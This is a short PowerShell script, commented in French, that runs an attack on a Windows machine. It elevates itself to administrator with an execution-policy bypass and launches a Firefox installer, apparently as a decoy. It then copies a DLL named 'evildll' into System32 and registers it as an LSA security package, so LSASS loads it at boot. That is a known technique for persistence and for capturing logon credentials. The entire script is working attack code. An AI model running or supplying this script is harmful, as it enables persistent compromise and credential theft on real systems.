# Demande d'élévation des privilèges
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Lancement de l'exécutable
Start-Process "C:\Users\test\Documents\firefox\exe\Firefox Installer.exe"

# Copie de la DLL dans System32
Copy-Item "C:\Users\test\Documents\firefox\dll\evildll.dll" -Destination "C:\Windows\System32"

# Modification de la clé de registre
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -Value "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0evildll"
